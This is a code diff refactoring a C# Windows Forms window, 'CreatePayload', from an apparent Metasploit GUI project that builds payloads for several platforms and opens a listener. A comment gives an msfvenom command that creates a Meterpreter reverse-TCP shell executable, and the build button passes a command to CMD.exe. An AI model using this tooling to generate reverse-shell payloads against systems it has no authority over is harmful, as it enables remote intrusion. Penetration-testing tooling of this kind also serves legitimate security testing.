@@ -14,9 +14,12 @@ namespace Metasploit_GUI
 {
     public partial class CreatePayload : Form
     {
+
         public string systemroot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
         public string filetype;
+
         public static string Payload;
+
         public CreatePayload()
         {
             InitializeComponent();
@@ -30,6 +33,8 @@ namespace Metasploit_GUI
             {
                 groupBox5.Enabled = false;
             }
+
+            Statics.wCreatePayload = this;
         }
 
         public void UpdateHost()
@@ -38,59 +43,55 @@ namespace Metasploit_GUI
             textBoxLport.Text = Statics.lport;
         }
 
-        static public void UpdateHostFromSpace()
+        public static void UpdateHostFromSpace()
         {
             //new CreatePayload cp; //byg vidrer
-            CreatePayload cp = new CreatePayload();
-            cp.UpdateHost();
+            /*CreatePayload cp = new CreatePayload();
+            cp.UpdateHost();*/
+            Statics.wCreatePayload.UpdateHost();
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
             //new Options().Show();
-            new Profiles().Show();
+            Profiles wProfiles = new Profiles();
+            wProfiles.ShowDialog();
+
             UpdateHost();
         }
-
-        /*
-        private void groupBox1_Enter(object sender, EventArgs e)
-        {
-
-        }*/
-
-        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
+        
+        private void comboBoxTargetType_SelectedIndexChanged(object sender, EventArgs e)
         {
             Payload = comboBoxTargetType.SelectedItem.ToString();
             Console.WriteLine(comboBoxTargetType.SelectedIndex);
-            int index = comboBoxTargetType.SelectedIndex;
-            if(index == 0 || index == 1)
+
+            switch (comboBoxTargetType.SelectedIndex)
             {
-                labelTargetfiletype.Text = "Windows";
-                filetype = "exe";
-            }
-            if(index == 2)
-            {
-                labelTargetfiletype.Text = "Webserver: Windows, Linux";
-                filetype = "raw";
-            }
-            if(index == 3)
-            {
-                labelTargetfiletype.Text = "OS X";
-                filetype = "macho";
-            }
-            if(index == 4)
-            {
-                labelTargetfiletype.Text = "OS X, Linux";
-                filetype = "elf";
-            }
-            if(index == 5)
-            {
-                labelTargetfiletype.Text = "Windows";
-                filetype = "raw";
+                case 0:
+                case 1:
+                    labelTargetfiletype.Text = "Windows";
+                    filetype = "exe";
+                    break;
+                case 2:
+                    labelTargetfiletype.Text = "Webserver: Windows, Linux";
+                    filetype = "raw";
+                    break;
+                case 3:
+                    labelTargetfiletype.Text = "OS X";
+                    filetype = "macho";
+                    break;
+                case 4:
+                    labelTargetfiletype.Text = "OS X, Linux";
+                    filetype = "elf";
+                    break;
+                case 5:
+                    labelTargetfiletype.Text = "Windows";
+                    filetype = "raw";
+                    break;
             }
         }
 
-        private void button2_Click(object sender, EventArgs e)
+        private void buttonBuild_Click(object sender, EventArgs e)
         {
             //msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
             string strCmdText;
@@ -119,34 +120,33 @@ namespace Metasploit_GUI
             System.Diagnostics.Process.Start("CMD.exe", strCmdText);
         }
 
-        private void button3_Click(object sender, EventArgs e)
+        private void buttonSelectFilepath_Click(object sender, EventArgs e)
         {
-            int index = comboBoxTargetType.SelectedIndex;
-            if (index == 0 || index == 1)
+            switch (comboBoxTargetType.SelectedIndex)
             {
-                saveFileDialog1.DefaultExt = "exe";
-                saveFileDialog1.Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*";
+                case 0:
+                case 1:
+                    saveFileDialog1.DefaultExt = "exe";
+                    saveFileDialog1.Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*";
+                    break;
+                case 2:
+                    saveFileDialog1.DefaultExt = "php";
+                    saveFileDialog1.Filter = "PHP: Hypertext Preprocessor (*.php)|*.php|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
+                    break;
+                case 3:
+                    saveFileDialog1.DefaultExt = "macho";
+                    saveFileDialog1.Filter = "Mach-O (*.macho)|*.macho|All files (*.*)|*.*";
+                    break;
+                case 4:
+                    saveFileDialog1.DefaultExt = "elf";
+                    saveFileDialog1.Filter = "Homebrew (*.elf)|*.elf|All files (*.*)|*.*";
+                    break;
+                case 5:
+                    saveFileDialog1.DefaultExt = "bat";
+                    saveFileDialog1.Filter = "Batch (*.bat)|*.bat|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
+                    break;
             }
-            if (index == 2)
-            {
-                saveFileDialog1.DefaultExt = "php";
-                saveFileDialog1.Filter = "PHP: Hypertext Preprocessor (*.php)|*.php|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
-            }
-            if (index == 3)
-            {
-                saveFileDialog1.DefaultExt = "macho";
-                saveFileDialog1.Filter = "Mach-O (*.macho)|*.macho|All files (*.*)|*.*";
-            }
-            if (index == 4)
-            {
-                saveFileDialog1.DefaultExt = "elf";
-                saveFileDialog1.Filter = "Homebrew (*.elf)|*.elf|All files (*.*)|*.*";
-            }
-            if (index == 5)
-            {
-                saveFileDialog1.DefaultExt = "bat";
-                saveFileDialog1.Filter = "Batch (*.bat)|*.bat|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
-            }
+
             saveFileDialog1.ShowDialog();
             saveLocation.Text = saveFileDialog1.FileName;
         }
@@ -156,9 +156,14 @@ namespace Metasploit_GUI
             UpdateHost();
         }
 
-        private void button5_Click(object sender, EventArgs e)
+        private void buttonCreateListener_Click(object sender, EventArgs e)
         {
             new ConsoleWindow(ConsoleStartOptions.handler).Show();
+        }
+
+        private void comboBoxEncoders_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
         }
     }
 }
